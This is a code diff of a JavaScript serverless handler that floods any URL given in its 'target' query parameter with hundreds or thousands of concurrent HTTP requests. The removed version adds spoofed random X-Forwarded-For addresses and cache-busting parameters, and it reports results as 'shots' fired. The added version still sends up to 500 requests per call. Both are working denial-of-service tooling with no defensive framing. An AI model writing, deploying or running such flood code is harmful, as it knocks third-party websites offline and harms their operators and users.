@@ -1,23 +1,26 @@
-export const config = { runtime: 'edge' };
-
-export default async function handler(req) {
+export default async function handler(req, res) {
     const url = new URL(req.url);
     const target = url.searchParams.get('target');
-    const count = Math.min(parseInt(url.searchParams.get('count') || '100'), 3000);
+    const count = parseInt(url.searchParams.get('count') || '100');
     
-    if (!target) return new Response("TARGET 없음");
-    
-    const promises = [];
-    for (let i = 0; i < count; i++) {
-        const randUrl = target + (target.includes('?') ? '&' : '?') + '_=' + Math.random() + Date.now();
-        promises.push(fetch(randUrl, { 
-            headers: { 'X-Forwarded-For': Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255) },
-            cache: 'no-store' 
-        }).catch(() => null));
+    if (!target) {
+        return res.status(400).send("TARGET_MISSING");
     }
     
-    const results = await Promise.allSettled(promises);
-    const success = results.filter(r => r.status === 'fulfilled' && r.value?.ok !== false).length;
-    
-    return new Response(`${count}발 중 ${success}발 성공 / ${count-success}발 실패`);
+    try {
+        const promises = [];
+        for (let i = 0; i < Math.min(count, 500); i++) {
+            promises.push(
+                fetch(target, {
+                    method: 'GET',
+                    headers: { 'User-Agent': 'Mozilla/5.0' },
+                    cache: 'no-store'
+                }).catch(() => null)
+            );
+        }
+        await Promise.allSettled(promises);
+        return res.status(200).send(`OK: ${count} requests sent`);
+    } catch (err) {
+        return res.status(500).send(`ERROR: ${err.message}`);
+    }
 }
